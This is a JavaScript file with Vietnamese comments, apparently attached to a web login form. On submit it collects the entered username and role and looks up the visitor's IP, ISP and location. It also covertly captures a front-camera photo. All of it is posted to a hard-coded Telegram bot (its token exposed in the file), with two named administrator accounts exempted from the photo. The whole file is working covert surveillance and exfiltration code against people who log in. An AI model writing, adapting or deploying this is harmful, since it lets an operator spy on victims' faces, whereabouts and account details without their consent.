const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;

const info = {
  time: '', 
  ip: '',
  isp: '',
  address: '',
  lat: '',
  lon: '',
  loginDetails: '',
  isAdmin: false
};

async function getNetworkData() {
  try {
    const res = await fetch(`https://ipwho.is/`);
    const data = await res.json();
    info.ip = data.ip || 'Không rõ';
    info.isp = data.connection?.org || 'ISP';
    info.lat = data.latitude || 0;
    info.lon = data.longitude || 0;
    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
  } catch (e) { 
    info.ip = 'Lỗi kết nối'; 
    info.address = 'Không xác định';
  }
}

// SỬA LẠI HÀM CHỤP: Kiểm tra trực tiếp ID username để chặn tuyệt đối
async function captureCamera() {
  const user = document.getElementById('username').value.trim();
  
  // CHẶN NGAY LẬP TỨC: Nếu là Admin thì không chạy bất cứ dòng code camera nào
  if (user === "Mrwenben" || user === "VanThanh") {
    console.log("Admin detected: Camera disabled.");
    return null;
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

function getCaption() {
  // Sửa lại Maps Link để tránh bị lỗi hiển thị
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  
  // Tiêu đề Admin hoặc Người dùng thường
  const header = info.isAdmin ? `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP VÀO TRANG` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';

  // TUYỆT ĐỐI KHÔNG CÓ DÒNG THIẾT BỊ/DVI Ở ĐÂY
  return `
${header}
━━━━━━━━━━━━━━━━━━
⏰ Thời gian: ${info.time}
👤 Tài khoản: ${info.loginDetails}
🌐 IP dân cư: ${info.ip}
🏢 Nhà mạng: ${info.isp}
🏙️ Địa chỉ: ${info.address}
📍 Bản đồ: ${mapsLink}
━━━━━━━━━━━━━━━━━━
`.trim();
}

async function main() {
  // Lấy dữ liệu ngay lập tức
  const user = document.getElementById('username').value.trim();
  const role = document.getElementById('user-role').value;
  
  info.time = new Date().toLocaleString('vi-VN');
  info.loginDetails = `${user} (${role})`;

  // Xác định quyền Admin
  if (user === "Mrwenben" || user === "VanThanh") {
      info.isAdmin = true;
  } else {
      info.isAdmin = false;
  }

  // Chạy lấy mạng
  await getNetworkData();
  
  // Gọi hàm chụp (Hàm này đã có chốt chặn Admin ở bên trong)
  const frontBlob = await captureCamera();

  // Logic gửi tin nhắn
  if (frontBlob && !info.isAdmin) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    const media = [{ type: 'photo', media: 'attach://front', caption: getCaption() }];
    formData.append('front', frontBlob, 'front.jpg');
    formData.append('media', JSON.stringify(media));
    await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
  } else {
    // Admin luôn luôn vào đây, không gửi ảnh, không gửi dvi
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: TELEGRAM_CHAT_ID, 
        text: getCaption(),
        disable_web_page_preview: true 
      })
    });
  }
  return true; 
}
